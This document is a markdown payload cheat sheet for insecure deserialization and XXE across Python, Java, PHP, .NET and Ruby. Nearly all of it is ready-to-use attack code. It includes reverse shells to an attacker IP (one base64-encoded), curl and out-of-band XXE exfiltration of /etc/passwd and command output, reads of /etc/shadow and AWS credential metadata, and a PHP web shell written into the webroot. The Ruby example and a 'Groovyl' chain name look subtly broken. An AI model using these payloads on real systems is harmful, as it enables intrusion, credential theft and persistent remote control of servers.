# Insecure Deserialization — Attack Payloads

## Python pickle RCE Payload

### Reverse Shell via pickle
```python
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        # __reduce__ is called by pickle.loads to reconstruct the object
        # Return a callable and its arguments — pickle will call callable(*args)
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"'
        return (os.system, (cmd,))

# Serialize the payload
payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()
print(f"Payload (base64): {encoded}")

# Send as cookie or POST body:
# curl -b "session={encoded}" https://target.com/api/restore
```

### Python subprocess reverse shell (bypasses os.system restrictions)
```python
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/bash', '-c',
            'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

### Python pickle — Command Output Exfiltration (no outbound connection)
```python
import pickle, subprocess, base64

class Exfil:
    def __reduce__(self):
        # Write command output to a web-accessible file
        return (subprocess.check_output, (['id'],))

# Alternative: write to file
class WriteFile:
    def __reduce__(self):
        return (open, ('/var/www/html/pwned.txt', 'w'))
```

---

## Python yaml.load RCE Payloads

### Direct os.system execution
```yaml
!!python/object/apply:os.system ["id > /tmp/pwned"]
```

### Reverse shell via subprocess
```yaml
!!python/object/apply:subprocess.Popen
- - /bin/bash
  - -c
  - bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

### Read arbitrary file
```yaml
!!python/object/apply:builtins.open ["/etc/shadow", "r"]
```

### Full object instantiation (Python < 3.12)
```yaml
!!python/object:os.path
- /etc/passwd
```

---

## Java ysoserial Gadget Chain Payloads

### Generate CommonCollections1 gadget chain (requires vulnerable target classpath)
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# Generate payload for commons-collections 3.x (execute command)
java -jar ysoserial-all.jar CommonsCollections1 'id > /tmp/pwned' | base64 -w0

# Generate payload for commons-collections 4.x
java -jar ysoserial-all.jar CommonsCollections6 'curl http://10.10.14.1:8080/?pwned=$(id|base64)' | base64 -w0

# Reverse shell:
java -jar ysoserial-all.jar CommonsCollections1 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|bash' \
  | base64 -w0
```

### Send serialized payload to Java endpoint
```bash
# As raw POST body (Content-Type: application/x-java-serialized-object)
payload=$(java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned')
curl -X POST https://target.com/api/restore \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary "$payload"

# As base64 in JSON body
encoded=$(java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 -w0)
curl -X POST https://target.com/api/restore \
  -H "Content-Type: application/json" \
  -d "{\"data\": \"$encoded\"}"
```

### Gadget chain selection guide
| Library in classpath | ysoserial chain |
|---|---|
| commons-collections 3.1 | CommonsCollections1, CC2, CC3 |
| commons-collections 4.0 | CommonsCollections4, CC6 |
| commons-beanutils 1.9.2 | CommonsBeanutils1 |
| Spring Framework | Spring1, Spring2 |
| Groovy | Groovyl |
| JRE (no extra libs) | URLDNS (DNS callback only), JRMPClient |

---

## PHP POP Chain Construction

### Crafting a Serialized PHP Object
```php
<?php
// Step 1: Identify gadget classes in the codebase that have dangerous magic methods
// Step 2: Construct the object graph manually
// Step 3: serialize() and send

class FileWriter {
    public $filename = '/var/www/html/shell.php';
    public $content = '<?php system($_GET["cmd"]); ?>';
    // __destruct() writes $content to $filename
}

$payload = new FileWriter();
$serialized = serialize($payload);
// O:10:"FileWriter":2:{s:8:"filename";s:29:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}

$encoded = base64_encode($serialized);
echo $encoded;
// Send as: curl -b "session=$encoded" https://target.com/
```

### PHP serialized object format reference
```
O:<name_len>:"<classname>":<prop_count>:{
  s:<len>:"<prop_name>";
  <type>:<val>;
}

Types:
  s:<len>:"<string>"   — string
  i:<int>              — integer
  b:<0|1>              — boolean
  N                    — null
  O:...                — nested object
  a:<n>:{...}         — array
```

---

## XXE Payloads

### Classic XXE — Local File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### XXE — /etc/shadow (requires root or www-data in shadow group)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<root><data>&xxe;</data></root>
```

### XXE — AWS instance metadata SSRF
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

### Blind XXE — Out-of-Band via HTTP (attacker controls dtd.xml)
```xml
<!-- Payload sent to target: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://10.10.14.1:8080/dtd.xml">
  %remote;
  %payload;
  %send;
]>
<root/>
```

```xml
<!-- dtd.xml hosted on attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://10.10.14.1:8080/?data=%file;'>">
```

### Blind XXE — OOB via FTP (for binary files)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "ftp://10.10.14.1:21/dtd.xml">
  %dtd;
]>
```

### XXE — Server-Side Request Forgery (internal service enumeration)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<root><data>&xxe;</data></root>
```

---

## .NET BinaryFormatter / ysoserial.net Payloads

### Generate payload with ysoserial.net
```bash
# Windows (or via Wine on Linux)
# Download: https://github.com/pwntester/ysoserial.net

# BinaryFormatter gadget chain (TypeConfuseDelegate)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c calc.exe" -o base64

# For .NET Core / .NET 5+ (ActivitySurrogateSelector):
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector \
  -c "cmd /c powershell -enc <base64_payload>" -o base64

# JSON.NET with TypeNameHandling:
ysoserial.exe -f Json.Net -g ObjectDataProvider \
  -c "cmd /c whoami > C:\\inetpub\\wwwroot\\pwned.txt" -o raw
```

### JSON.NET TypeNameHandling payload (raw)
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c whoami > C:\\inetpub\\wwwroot\\pwned.txt"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

---

## Ruby Marshal Payload

```ruby
# Ruby Marshal payload for RCE (requires eval-capable class in scope)
# Most Ruby exploits use __init__ hooks or custom marshal_load methods

# Craft payload in irb:
require 'base64'

class Exploit
  def marshal_dump
    # This gets called during Marshal.dump — attacker-side
    []
  end

  def marshal_load(arr)
    # This gets called during Marshal.load on the victim
    system('id > /tmp/pwned')
  end
end

payload = Base64.encode64(Marshal.dump(Exploit.new))
puts payload
# Send as cookie or POST parameter
```
